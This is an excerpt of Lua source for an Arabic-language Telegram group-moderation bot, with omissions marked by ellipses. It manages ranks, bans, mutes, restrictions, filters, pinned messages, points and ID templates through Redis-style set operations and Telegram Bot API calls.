DevRio:srem(ARAY..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'riosudo' then
DevRio:srem(ARAY..'Rio:SecondSudo:', result.id_)
DevRio:srem(ARAY..'Rio:SudoBot:', result.id_)
DevRio:srem(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(ARAY..'Rio:RioSudo:',result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(ARAY..'Rio:RioSudo:',result.id_)
...
DevRio:sadd(ARAY..'Rio:RioSudo:',user)
...
DevRio:srem(ARAY..'Rio:RioSudo:',user)
...
function sudo_reply(extra, result, success)
DevRio:sadd(ARAY..'Rio:SecondSudo:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(ARAY..'Rio:SecondSudo:',result.id_)
...
DevRio:sadd(ARAY..'Rio:SecondSudo:',user)
...
DevRio:srem(ARAY..'Rio:SecondSudo:',user)
...
function sudo_reply(extra, result, success)
DevRio:sadd(ARAY..'Rio:SudoBot:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(ARAY..'Rio:SudoBot:',result.id_)
...
DevRio:sadd(ARAY..'Rio:SudoBot:',user)
...
DevRio:srem(ARAY..'Rio:SudoBot:',user)
...
DevRio:sadd(ARAY..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(ARAY..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevRio:sadd(ARAY..'Rio:Owner:'..msg.chat_id_,user)
...
DevRio:srem(ARAY..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
DevRio:srem(ARAY..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevRio:srem(ARAY..'Rio:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(ARAY.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'↯︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevRio:sadd(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevRio:srem(ARAY..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevRio:sadd(ARAY..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(ARAY..'Rio:Constructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(ARAY..'Rio:Constructor:'..msg.chat_id_,user)
...
DevRio:srem(ARAY..'Rio:Constructor:'..msg.chat_id_,user)
...
DevRio:sadd(ARAY..'Rio:Managers:'..msg.chat_id_,user)
...
DevRio:srem(ARAY..'Rio:Managers:'..msg.chat_id_,user)
...
DevRio:sadd(ARAY..'Rio:Cleaner:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(ARAY..'Rio:Cleaner:'..msg.chat_id_,result.id_)
...
DevRio:sadd(ARAY..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevRio:srem(ARAY..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevRio:sadd(ARAY..'Rio:Admins:'..msg.chat_id_,user)
...
DevRio:srem(ARAY..'Rio:Admins:'..msg.chat_id_,user)
...
DevRio:sadd(ARAY..'Rio:VipMem:'..msg.chat_id_,user)
...
DevRio:srem(ARAY..'Rio:VipMem:'..msg.chat_id_,user)
...
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..ARAY)
local GetInfo = JSON.decode(Check)
...
ARAYTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
send(msg.sender_user_id_, 0,ARAYTeam[math.random(#ARAYTeam)])
end
--     Source ARAY     --
...
DevRio:del(ARAY.."Rio:Lock:ProSet"..msg.chat_id_)
...
DevRio:set(ARAY.."Rio:Lock:ProSet"..msg.chat_id_,"true")
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
--     Source ARAY     --
...
if not RioConstructor(msg) and DevRio:get(ARAY.."Rio:Lock:KickBan"..msg.chat_id_) then 
...
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(ARAY..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if not Constructor(msg) and DevRio:get(ARAY.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'↯︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
...
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(ARAY..'Rio:Ban:'..msg.chat_id_, result.id_)
...
ChatKick(msg.chat_id_, user)
DevRio:sadd(ARAY..'Rio:Ban:'..msg.chat_id_, user)
...
DevRio:srem(ARAY..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
DevRio:srem(ARAY..'Rio:Ban:'..msg.chat_id_, result.id_)
...
DevRio:srem(ARAY..'Rio:Ban:'..msg.chat_id_, user)
...
if not RioConstructor(msg) and DevRio:get(ARAY.."Rio:Lock:MuteTked"..msg.chat_id_) then 
...
if DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","↯︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(ARAY..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","↯︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(ARAY..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","↯︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(ARAY..'Rio:Muted:'..msg.chat_id_, user)
...
if not DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","↯︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(ARAY..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if not DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","↯︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(ARAY..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if not DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","↯︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(ARAY..'Rio:Muted:'..msg.chat_id_, user)
...
DevRio:sadd(ARAY..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:sadd(ARAY..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevRio:sadd(ARAY..'Rio:Tkeed:'..msg.chat_id_, user)
...
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_, user)
...
if DevRio:sismember(ARAY..'Rio:RioSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(ARAY..'Rio:SecondSudo:',result.sender_user_id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(ARAY..'Rio:BanAll:', result.sender_user_id_)
...
if DevRio:sismember(ARAY..'Rio:RioSudo:',result.id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(ARAY..'Rio:SecondSudo:',result.id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(ARAY..'Rio:BanAll:', result.id_)
...
if tonumber(user) == tonumber(ARAY) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
...
if DevRio:sismember(ARAY..'Rio:RioSudo:',user) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(ARAY..'Rio:SecondSudo:',user) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevRio:sadd(ARAY..'Rio:BanAll:', user)
...
DevRio:sadd(ARAY..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(ARAY..'Rio:MuteAll:', result.id_)
...
DevRio:sadd(ARAY..'Rio:MuteAll:', user)
...
DevRio:srem(ARAY..'Rio:BanAll:', result.sender_user_id_)
DevRio:srem(ARAY..'Rio:MuteAll:', result.sender_user_id_)
...
if result.id_ then
DevRio:srem(ARAY..'Rio:BanAll:', result.id_)
DevRio:srem(ARAY..'Rio:MuteAll:', result.id_)
...
DevRio:srem(ARAY..'Rio:BanAll:', user)
DevRio:srem(ARAY..'Rio:MuteAll:', user)
...
DevRio:setex(ARAY.."Rio:EditDev"..msg.sender_user_id_,300,true)
end
if DevRio:get(ARAY.."Rio:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'↯︙تم الغاء امر تغير المطور الاساسي')
DevRio:del(ARAY.."Rio:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
...
if dp.first_name_ ~= false then
DevRio:del(ARAY.."Rio:EditDev"..msg.sender_user_id_)
DevRio:set(ARAY.."Rio:NewDev"..msg.sender_user_id_,dp.id_)
...
--     Source ARAY     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevRio:get(ARAY..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevRio:sismember(ARAY..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","↯︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","↯︙تم رفعه في قائمة المطايه") 
DevRio:sadd(ARAY..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source ARAY     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevRio:get(ARAY..'Rio:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevRio:sismember(ARAY..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","↯︙هو ليس مطي ليتم تنزيله") 
else
DevRio:srem(ARAY..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:set('ARAYTeam:'..ARAY..'id:user'..msg.chat_id_,TXT)  
DevRio:setex('ARAYTeam:'..ARAY.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
DevRio:del(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevRio:incrby(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
...
DevRio:set('ARAYTeam:'..ARAY..'ids:user'..msg.chat_id_,TXT)  
DevRio:setex('ARAYTeam:'..ARAY.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
...
function Reply(extra, result, success)
DevRio:incrby(ARAY..'Rio:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevRio:get(ARAY..'Rio:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(ARAY.."Rio:cleaner"..msg.chat_id_, msg.id_) else DevRio:sadd(ARAY.."Rio:cleaner"..msg.chat_id_, msg.id_) end end end
if DevRio:get(ARAY..'Rio:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(ARAY.."Rio:cleanernum"..msg.chat_id_, msg.id_) else DevRio:sadd(ARAY.."Rio:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevRio:get(ARAY..'Rio:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevRio:sadd(ARAY.."Rio:cleanermusic"..msg.chat_id_, msg.id_) else DevRio:sadd(ARAY.."Rio:cleanermusic"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevRio:sismember(ARAY.."Rio:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
...
if data.ID == "Ok" then
DevRio:set(ARAY..'Rio:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
...
local List = DevRio:smembers(ARAY..'Rio:VipMem:'..msg.chat_id_)
text = "↯︙قائمة المميزين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(ARAY..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(ARAY..rio)
text = "↯︙قائمة الادمنيه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(ARAY..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(ARAY..'Rio:Managers:'..msg.chat_id_)
text = "↯︙قائمة المدراء ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(ARAY..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(ARAY..'Rio:Cleaner:'..msg.chat_id_)
text = "↯︙قائمة المنظفين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(ARAY..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(ARAY..'Rio:Constructor:'..msg.chat_id_)
text = "↯︙قائمة المنشئين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(ARAY..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(ARAY..'Rio:Owner:'..msg.chat_id_)
text = "↯︙قائمة المالكين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(ARAY..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(ARAY..'Rio:BasicConstructor:'..msg.chat_id_)
...
local List = DevRio:smembers(ARAY..'Rio:Muted:'..msg.chat_id_)
...
local List = DevRio:smembers(ARAY..'Rio:Tkeed:'..msg.chat_id_)
text = "↯︙قائمة المقيدين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local username = DevRio:get(ARAY..'Save:UserName'..v)
if username then
...
local List = DevRio:smembers(ARAY..'Rio:Ban:'..msg.chat_id_)
...
local List = DevRio:smembers(ARAY..'User:Donky:'..msg.chat_id_)
...
local List = DevRio:hkeys(ARAY..'Rio:Filters:'..msg.chat_id_)
text = "↯︙قائمة المنع ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
...
local List = DevRio:smembers(ARAY..'Rio:RioSudo:')
...
local List = DevRio:smembers(ARAY..'Rio:SecondSudo:')
...
local BanAll = DevRio:smembers(ARAY..'Rio:BanAll:')
local MuteAll = DevRio:smembers(ARAY..'Rio:MuteAll:')
if #BanAll ~= 0 then 
...
local List = DevRio:smembers(ARAY..'Rio:SudoBot:')
text = "↯︙قائمة المطورين ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local sudouser = DevRio:get(ARAY..'Rio:Sudos'..v) 
local username = DevRio:get(ARAY..'Save:UserName'..v)
if username then
...
DevRio:sadd(ARAY.."Rio:RioConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
...
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevRio:srem(ARAY.."Rio:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevRio:srem(ARAY.."Rio:FilterPhoto"..msg.chat_id_,photo)
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevRio:srem(ARAY.."Rio:FilterAnimation"..msg.chat_id_,idanimation)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(ARAY..'Rio:Thwel:Rio'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local ARAYTeam = '↯︙اهلا عزيزي ↫ '..RioRank(msg)..' \n↯︙تم تعطيل تحويل الصيغ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ARAYTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(ARAY..'Rio:Thwel:Rio'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevRio:get(ARAY..'Rio:Thwel:Rio'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevRio:get(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevRio:get(ARAY..'Rio:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevRio:sismember(ARAY..'Rio:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(ARAY..'Rio:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(ARAY..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(ARAY..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(ARAY..'Rio:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n↯︙عدد الكروبات ↫ '..(DevRio:get(ARAY..'Rio:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevRio:get(ARAY..'Rio:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevRio:sismember(ARAY..'Rio:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(ARAY..'Rio:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(ARAY..'Rio:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(ARAY..'Rio:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(ARAY..'Rio:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n↯︙عدد الكروبات ↫ '..(DevRio:get(ARAY..'Rio:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
...
local user_msgs = DevRio:get(ARAY..'Rio:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevRio:get(ARAY..'Rio:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevRio:sismember(ARAY..'Rio:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevRio:sismember(ARAY..'Rio:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevRio:sismember(ARAY..'Rio:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevRio:sismember(ARAY..'Rio:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
...
if DevRio:sismember(ARAY..'Rio:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n↯︙عدد الكروبات ↫ '..(DevRio:get(ARAY..'Rio:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
...
if DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevRio:sismember(ARAY..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(ARAY..'Rio:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(ARAY..'Rio:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(ARAY..'Rio:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
...
if result.id_ then
if DevRio:sismember(ARAY..'Rio:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevRio:sismember(ARAY..'Rio:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevRio:sismember(ARAY..'Rio:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevRio:sismember(ARAY..'Rio:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevRio:sismember(ARAY..'Rio:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙الحظر العام ↫ '..banall..'\n↯︙الكتم العام ↫ '..muteall..'\n↯︙الحظر ↫ '..banned..'\n↯︙الكتم ↫ '..muted..'\n↯︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙*المعرف غير صحيح*', 1, 'md')  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(ARAY..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(ARAY..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(ARAY..'Rio:BanAll:',result.sender_user_id_) DevRio:srem(ARAY..'Rio:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(ARAY..'Rio:Ban:'..msg.chat_id_,result.sender_user_id_) DevRio:srem(ARAY..'Rio:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(ARAY..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(ARAY..'Rio:Muted:'..msg.chat_id_,user) DevRio:srem(ARAY..'Rio:BanAll:',user) DevRio:srem(ARAY..'Rio:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_,user) DevRio:srem(ARAY..'Rio:Ban:'..msg.chat_id_,user) DevRio:srem(ARAY..'Rio:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
...
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(ARAY..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(ARAY..'Rio:Muted:'..msg.chat_id_,result.id_) DevRio:srem(ARAY..'Rio:BanAll:',result.id_) DevRio:srem(ARAY..'Rio:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevRio:srem(ARAY..'Rio:Tkeed:'..msg.chat_id_,result.id_) DevRio:srem(ARAY..'Rio:Ban:'..msg.chat_id_,result.id_) DevRio:srem(ARAY..'Rio:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
...
DevRio:set(ARAY.."Rio:GpIds:Text"..msg.chat_id_,Text_Rand)
...
DevRio:set("ARAY:New:id:"..ARAY..msg.sender_user_id_,'ARAYTeam')
return "ARAYTeam"
end
if text and DevRio:get("ARAY:New:id:"..ARAY..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevRio:del("ARAY:New:id:"..ARAY..msg.sender_user_id_)
return false
end
DevRio:del("ARAY:New:id:"..ARAY..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevRio:set(ARAY.."Rio:AllIds:Text",text)
return false
end
...
DevRio:del(ARAY.."Rio:AllIds:Text")
end
end
--     Source ARAY     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '↯︙رجائا اتبع التعليمات للتعيين \n↯︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉', 1, 'md')
